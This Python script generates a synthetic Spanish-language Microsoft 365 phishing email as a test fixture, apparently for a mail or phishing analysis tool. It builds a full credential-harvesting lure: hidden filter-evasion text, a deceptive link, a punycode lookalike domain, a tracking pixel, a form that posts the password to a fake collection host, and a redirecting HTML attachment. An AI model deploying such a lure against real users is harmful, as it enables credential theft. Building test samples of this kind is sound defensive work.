#!/usr/bin/env python3
"""Genera samples/sample-phishing.eml: correo de phishing sintetico para pruebas.

Todo el contenido es inventado. No hay malware real: los "adjuntos" son texto.
"""
import base64
import os

HERE = os.path.dirname(os.path.abspath(__file__))

HTML = """<html><body style="font-family:Segoe UI,Arial">
<div style="font-size:0;color:#ffffff">factura seguimiento ref 88213 correo legitimo confianza</div>
<p>Estimado usuario,</p>
<p><b>Su buz&oacute;n de Microsoft 365 ser&aacute; suspendido en 24 horas.</b>
Debe verificar su contrase&ntilde;a para evitar el bloqueo de la cuenta.</p>
<p><a href="http://microsoft-login.verify-account.tk/o365/login.php?id=dGFyZ2V0">
https://login.microsoftonline.com/verify</a></p>
<p><a href="http://185.199.110.153:8080/session/update">Revisar actividad reciente</a></p>
<p><a href="https://xn--micrsoft-y0a.com/portal">Portal de administraci&oacute;n</a></p>
<p><a href="https://bit.ly/3xQzPla">Descargar informe</a></p>
<img src="http://track.verify-account.tk/px.gif?u=dXNlcg==" width="1" height="1">
<form action="http://microsoft-login.verify-account.tk/collect.php" method="post">
  <input type="text" name="user" placeholder="Correo">
  <input type="password" name="pass" placeholder="Contrase&ntilde;a">
  <input type="submit" value="Verificar">
</form>
<p style="font-size:9px;color:#888">Microsoft Corporation, One Microsoft Way, Redmond WA</p>
</body></html>"""

PLAIN = """Estimado usuario,

Su buzon de Microsoft 365 sera suspendido en 24 horas. Verifique su contrasena:
http://microsoft-login.verify-account.tk/o365/login.php?id=dGFyZ2V0

Soporte Microsoft 365
"""

HTML_ATTACH = """<!doctype html><meta http-equiv="refresh" content="0;url=http://microsoft-login.verify-account.tk/o365/login.php">
<title>Outlook</title><body>Cargando su sesion...</body>"""

DOCM = b"PK\x03\x04" + b"FAKE-OOXML-CON-MACROS-PARA-PRUEBAS" * 12

EML = """Received: from mx1.corp-victima.es (mx1.corp-victima.es [10.20.0.5])
 by imap.corp-victima.es (Postfix) with ESMTPS id 9F2B14A21C
 for <maria.lopez@corp-victima.es>; Mon, 10 Aug 2026 09:14:52 +0200 (CEST)
Received: from vps-4412.cheap-hosting.ru (vps-4412.cheap-hosting.ru [185.220.101.44])
 by mx1.corp-victima.es (Postfix) with ESMTP id 3D19A22B07
 for <maria.lopez@corp-victima.es>; Mon, 10 Aug 2026 09:14:31 +0200 (CEST)
Received: from localhost (unknown [45.155.205.233])
 by vps-4412.cheap-hosting.ru (Exim 4.94) with SMTP id 1rXk2P-0007hQ-2s;
 Mon, 10 Aug 2026 07:12:03 +0000
Authentication-Results: mx1.corp-victima.es;
 spf=fail (sender IP is 185.220.101.44) smtp.mailfrom=bounce@cheap-hosting.ru;
 dkim=none (message not signed) header.d=none;
 dmarc=fail action=quarantine header.from=microsoft.com;
 compauth=fail reason=001
Received-SPF: fail (corp-victima.es: domain of cheap-hosting.ru does not designate
 185.220.101.44 as permitted sender) client-ip=185.220.101.44;
 envelope-from=bounce@cheap-hosting.ru;
Return-Path: <bounce@cheap-hosting.ru>
From: =?utf-8?B?TWljcm9zb2Z0IDM2NSBTZWd1cmlkYWQ=?= <no-reply@micros0ft-security.tk>
Reply-To: "Soporte O365" <recovery.desk@mail-verify.xyz>
To: maria.lopez@corp-victima.es
Subject: =?utf-8?Q?RE=3A_ACCI=C3=93N_REQUERIDA=3A_su_cuenta_ser=C3=A1_suspendida_en_24_horas?=
Date: Mon, 10 Aug 2026 09:12:01 +0200
Message-ID: <20260810071201.3D19A22B07@vps-4412.cheap-hosting.ru>
X-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)
X-Originating-IP: [45.155.205.233]
X-Priority: 1 (Highest)
Importance: High
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=_outer_9911"

--=_outer_9911
Content-Type: multipart/alternative; boundary="=_alt_5522"

--=_alt_5522
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable

{plain_qp}
--=_alt_5522
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: base64

{html_b64}
--=_alt_5522--

--=_outer_9911
Content-Type: text/html; name="Factura_88213.pdf.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Factura_88213.pdf.html"

{htmlatt_b64}
--=_outer_9911
Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Detalles.docm"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Detalles.docm"

{docm_b64}
--=_outer_9911--
"""


def qp(text):
    out = []
    for line in text.split("\n"):
        buf = ""
        for ch in line:
            o = ord(ch)
            if 33 <= o <= 126 and ch != "=":
                buf += ch
            elif ch == " ":
                buf += " "
            else:
                buf += "".join("=%02X" % b for b in ch.encode("utf-8"))
        out.append(buf)
    return "\n".join(out)


def wrap(b: bytes, n: int = 76) -> str:
    s = base64.b64encode(b).decode()
    return "\n".join(s[i:i + n] for i in range(0, len(s), n))


eml = EML.format(
    plain_qp=qp(PLAIN),
    html_b64=wrap(HTML.encode("utf-8")),
    htmlatt_b64=wrap(HTML_ATTACH.encode("utf-8")),
    docm_b64=wrap(DOCM),
).replace("\n", "\r\n")

path = os.path.join(HERE, "sample-phishing.eml")
with open(path, "wb") as fh:
    fh.write(eml.encode("utf-8"))
print("escrito", path, len(eml), "bytes")
